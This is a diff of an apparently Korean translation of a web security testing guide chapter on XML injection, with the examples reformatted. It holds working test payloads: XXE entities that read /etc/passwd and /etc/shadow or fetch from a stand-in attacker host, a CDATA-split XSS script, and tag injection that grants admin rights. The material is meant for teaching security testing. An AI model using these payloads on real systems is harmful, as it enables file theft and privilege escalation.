@@ -8,7 +8,7 @@ XML 인젝션 테스트
 
 |
 
-Summary
+개요
 ============================================================================================
 
 XML 인젝션 테스트는 침투 테스터가 어플리케이션에 XML 문서를 삽입하려 할 때 입니다.
@@ -21,10 +21,11 @@ XML 데이터 및 태그를 인젝션 시도하는 것이 가능할 것입니다
 
 |
 
-How to Test
+테스트 방법
 ============================================================================================
 
-아래 처럼 사용자 등록을 수행하기 위해 XML 스타일 통신을 사용하는 웹 어플리케이션이 있다고 가정합니다.
+아래 처럼 사용자 등록을 수행하기 위해 XML 스타일 통신을 사용하는 
+웹 어플리케이션이 있다고 가정합니다.
 계정이 생성이 되면, xmlDb 파일에 <user> 노드가 새로 추가됩니다.
 
 .. code-block:: xml
@@ -58,7 +59,10 @@ How to Test
 
 .. code-block:: console
 
-    http://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com
+    http://www.example.com/addUser.php?
+    username=tony&
+    password=Un6R34kb!e&
+    email=s4tan@hell.com
 
 어플리케이션에서는 다음 노드가 빌드됩니다.
 
@@ -99,7 +103,7 @@ How to Test
 
 |
 
-Discovery
+취약점 존재 확인
 -------------------------------------------------------------------------------------------
 
 어플리케이션에 XML 삽입 취약점이 존재하는지 테스트하기 위해 XML 메타 문자를 삽입하는 부분을 
@@ -115,7 +119,7 @@ Discovery
 
 .. code-block:: xml
 
-    <node attrib='$inputValue'/
+    <node attrib='$inputValue'/>
 
 그래서 만약 아래와 같이 삽입되면 다음과 같이 속성 값이 삽입됩니다.
 
@@ -125,7 +129,6 @@ Discovery
 
     <node attrib='foo''/> 
 
-then, the resulting XML document is not well formed. 
 
 |
 
@@ -145,7 +148,6 @@ then, the resulting XML document is not well formed.
 
     <node attrib="foo""/> 
 
-and the resulting XML document is invalid. 
 
 |
 
@@ -168,8 +170,6 @@ and the resulting XML document is invalid.
         <mail>s4tan@hell.com</mail> 
     </user> 
 
-but, because of the presence of the open '<', the resulting XML document is invalid. 
-
 |
 
 - 주석 태그: <!--/--> 
@@ -191,13 +191,12 @@ but, because of the presence of the open '<', the resulting XML document is inva
         <mail>s4tan@hell.com</mail> 
     </user> 
 
-which won't be a valid XML sequence. 
-
 |
 
 - 앰퍼센드: & 
 
-앰퍼센드는 엔티티를 표현하기 위한 XML 구문으로 사용됩니다. 엔티티의 형식은 '&symbol;' 입니다.
+앰퍼센드는 엔티티를 표현하기 위한 XML 구문으로 사용됩니다. 
+엔티티의 형식은 '&symbol;' 입니다.
 앤티티는 유니 코드 문자 집합의 문자에 매핑된다.
 
 [예제]
@@ -226,13 +225,14 @@ which won't be a valid XML sequence.
         <mail>s4tan@hell.com</mail> 
     </user> 
 
-but, again, the document is not valid: &foo is not terminated with ';' and the &foo; entity is undefined. 
-
 |
 
 - CDATA section delimiters: <![CDATA[ / ]]> 
 
-CDATA sections are used to escape blocks of text containing characters which would otherwise be recognized as markup. In other words, characters enclosed in a CDATA section are not parsed by an XML parser. For example, if there is the need to represent the string '<foo>' inside a text node, a CDATA section may be used: 
+CDATA 섹션은 마크업으로 인식될 수 있는 문자를 포함하는 텍스트 영역을 빠져나가는데 사용됩니다.
+즉, CDATA 섹션에 둘러싸인 문자는 XML 파서에 의해 해석되지 않습니다.
+
+예를 들어, 만약 텍스트 노드에 '<foo>' 문자를 표현해야 한다면, CDATA 섹션을 사용하면 됩니다.
 
 .. code-block:: xml
 
@@ -240,15 +240,15 @@ CDATA sections are used to escape blocks of text containing characters which wou
         <![CDATA[<foo>]]> 
     </node>
 
-so that '<foo>' won't be parsed as markup and will be considered as character data. 
+위의 '<foo>' 문자열은 파싱되지 않고 표현될 것입니다.
 
-If a node is built in the following way: 
+만약 노드가 다음 방법으로 빌드되어 있다면, 태스터는 
 
 .. code-block:: xml
 
     <username><![CDATA[<$userName]]></username> 
 
-the tester could try to inject the end CDATA string ']]>' in order to try to invalidate the XML document. 
+CDATA 문자열 끝에 ']]>' 문자열을 삽입할 수 있습니다.
 
 .. code-block:: xml
 
@@ -260,11 +260,11 @@ this will become:
 
     <username><![CDATA[]]>]]></username> 
 
-which is not a valid XML fragment. 
+CDATA 태그와 관련해서 또 다른 예제로 HTML 페이지를 생성할 수 있는 
+XML 문서라고 가정해봅시다.
 
-Another test is related to CDATA tag. Suppose that the XML document is processed to generate an HTML page. In this case, the CDATA section delimiters may be simply eliminated, without further inspecting their contents. Then, it is possible to inject HTML tags, which will be included in the generated page, completely bypassing existing sanitization routines. 
-
-Let's consider a concrete example. Suppose we have a node containing some text that will be displayed back to the user. 
+이 경우에는, CDATA 섹션이 필터링 목록에 없을 경우 CDATA를 통해 우회할 수 있습니다.
+아래 구체적인 예를 살펴봅시다.
 
 .. code-block:: xml
 
@@ -272,13 +272,14 @@ Let's consider a concrete example. Suppose we have a node containing some text t
         $HTMLCode
     </html> 
 
-Then, an attacker can provide the following input: 
+공격자는 다음과 같은 입력을 제공할 수 있습니다.
 
 .. code-block:: xml
 
-    $HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]> 
+    $HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>
+    alert('xss')<![CDATA[<]]>/script<![CDATA[>]]> 
 
-and obtain the following node: 
+그리고 다음 코드를 포함합니다.
 
 .. code-block:: xml
 
@@ -286,63 +287,70 @@ and obtain the following node:
         <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/ script<![CDATA[>]]> 
     </html> 
 
-During the processing, the CDATA section delimiters are eliminated, generating the following HTML code: 
+아래와 같이 CDATA 섹션은 제거되고, 다음 HTML 코드가 생성되게 됩니다.
 
 .. code-block:: xml
 
     <script>alert('XSS')</script> 
 
-The result is that the application is vulnerable to XSS. 
+결과적으로 XSS 취약점이 발생하게 됩니다.
 
 
 **External Entity:**
 
-The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems. 
+유효한 엔티티의 집합은 새로운 엔티티를 정의하여 확장될 수 있습니다. 
+만약 엔티티의 정의가 URI 라면, 엔티티는 외부 엔티티라고 합니다.
+다른 구성이 없는 한, 외부 엔티티가 URI(로컬 머신 또는 원격 시스템 파일)에 의해 
+지정된 리소스에 강제 접근합니다.
+이 동작은 XML 외부 엔티티(XXE) 공격에 노출됩니다.
 
-To test for XXE vulnerabilities, one can use the following input: 
+XXE 취약점을 테스트하기 위해서는 다음 입력을 사용할 수 있습니다. 
 
 .. code-block:: xml
 
     <?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo [ 
-    <!ELEMENT foo ANY >
-    <!ENTITY xxe SYSTEM "file://dev/random" >]><foo>&xxe;
+        <!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file://dev/random" >]><foo>&xxe;
     </foo> 
 
-This test could crash the web server (on a UNIX system), if the XML parser attempts to substitute the entity with the contents of the /dev/random file. 
-Other useful tests are the following: 
+이 테스트에서 만약 XML 파서가 /dev/random 파일 목록으로 엔티티를 대체하려고 하면,
+웹 서버가 종료될 수도 있습니다.
+
+또 다른 유용한 테스트 방법입니다.
 
 .. code-block:: xml
 
     <?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo [
-    <!ELEMENT foo ANY >
-
-    <!ENTITY xxe SYSTEM "file://etc/passwd" >]><foo>&xxe;</foo>
+        <!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file://etc/passwd" >]><foo>&xxe;</foo>
+    
     <?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo [
-    <!ELEMENT foo ANY >
-
-    <!ENTITY xxe SYSTEM "file://etc/shadow" >]><foo>&xxe;</foo>
+        <!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file://etc/shadow" >]><foo>&xxe;</foo>
+    
     <?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo [
-    <!ELEMENT foo ANY >
-
-    <!ENTITY xxe SYSTEM "file://c:/boot.ini" >]><foo>&xxe;</foo>
+        <!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file://c:/boot.ini" >]><foo>&xxe;</foo>
+    
     <?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo [
-    <!ELEMENT foo ANY >
-    <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" 
-    >]><foo>&xxe;</foo> 
+        <!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt">]><foo>&xxe;</foo> 
 
 |
 
-Tag Injection 
+태그 인젝션
 -------------------------------------------------------------------------------------------
 
-Once the first step is accomplished, the tester will have some information about the structure of the XML document. Then, it is possible to try to inject XML data and tags. We will show an example of how this can lead to a privilege escalation attack.
+첫번째 단계가 수행되면, 테스터는 XML 문서의 구조에 대한 정보를 얻을 것입니다.
+그리고나서, XML 데이터와 태그를 삽입할 수가 있습니다.
+아래에서 권한 상승 공격이 발생할 수 있는 방법을 예제로 보여줄 것입니다.
 
-Let's considering the previous application. By inserting the following values: 
+아래와 같이 이메일에 xml 태그 값을 입력합니다.
 
 .. code-block:: xml
 
@@ -350,7 +358,7 @@ Let's considering the previous application. By inserting the following values:
     Password: Un6R34kb!e 
     E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com 
 
-the application will build a new node and append it to the XML database: 
+어플리케이션은 새로운 노드를 빌드하고 XML 데이터베이스에 그것을 추가할 것입니다.
 
 .. code-block:: xml
 
@@ -376,9 +384,9 @@ the application will build a new node and append it to the XML database:
         </user>
     </users> 
 
-The resulting XML file is well formed. Furthermore, it is likely that, for the user tony, the value associated with the userid tag is the one appearing last, i.e., 0 (the admin ID). In other words, we have injected a user with administrative privileges. The only problem is that the userid tag appears twice in the last user node. Often, XML documents are associated with a schema or a DTD and will be rejected if they don't comply with it. 
+우리가 삽입한 사용자는 userid 태그에 0을 부여하여 관리자 권한을 획득하였습니다.
 
-Let's suppose that the XML document is specified by the following DTD: 
+XML 문서가 다음 DTD에 의해 지정되었다고 가정합니다.
 
 .. code-block:: xml
 
@@ -391,17 +399,19 @@ Let's suppose that the XML document is specified by the following DTD:
         <!ELEMENT mail (#PCDATA) > 
     ]> 
 
-Note that the userid node is defined with cardinality 1. In this case, the attack we have shown before (and other simple attacks) will not work, if the XML document is validated against its DTD before any processing occurs. 
+userid 노드가 cardinality 1으로 정의되어 있는 걸 체크합니다.
+이 경우에는, 모든 처리가 발생하기 전에 XML 문서가 DTD에 대해 검증되는 경우, 
+위 공격 방식은 동작하지 않습니다.
 
-However, this problem can be solved, if the tester controls the value of some nodes preceding the offending node (userid, in this example). In fact, the tester can comment out such node, by injecting a comment start/end sequence: 
+그러나, 테스터가 잘못된 노드 앞 일부 노드 값을 제어할 경우 문제는 해결될 수 있습니다.
+사실상, 테스터는 주석의 시작과 종료를 주입하여 노드들을 주석처리 할 수 있습니다.
 
 .. code-block:: xml
 
     Username: tony 
-    Password: Un6R34kb!e</password>
-    <!-E-mail: --><userid>0</userid><mail>s4tan@hell.com 
+    Password: Un6R34kb!e</password><!--
+    E-mail: --><userid>0</userid><mail>s4tan@hell.com 
 
-In this case, the final XML database is: 
 
 .. code-block:: xml
 
@@ -428,30 +438,22 @@ In this case, the final XML database is:
     </users> 
 
 
-The original userid node has been commented out, leaving only the injected one. The document now complies with its DTD rules. 
-
 |
 
 Tools 
 ============================================================================================
 
-- XML Injection Fuzz Strings (from wfuzz tool) - 
-
-https://wfuzz.googlecode.com/svn/trunk/wordlist/Injections/ XML.txt 
+- XML Injection Fuzz Strings (from wfuzz tool): https://github.com/xmendez/wfuzz
 
 |
 
 References 
 ============================================================================================
 
-**Whitepapers**
- 
-Alex Stamos: "Attacking Web Services" - 
+Whitepapers
+------------------------------------------------------------------------------------------
 
-http://www.owasp.org/images/d/d1/AppSec2005DC-Alex_Stamos-Attacking_Web_Services.ppt 
-
-Gregory Steuck, "XXE (Xml eXternal Entity) attack", 
-
-http://www.securityfocus.com/archive/1/297714 
+- Alex Stamos: "Attacking Web Services": http://www.owasp.org/images/d/d1/AppSec2005DC-Alex_Stamos-Attacking_Web_Services.ppt 
+- Gregory Steuck, "XXE (Xml eXternal Entity) attack": http://www.securityfocus.com/archive/1/297714 
 
 |
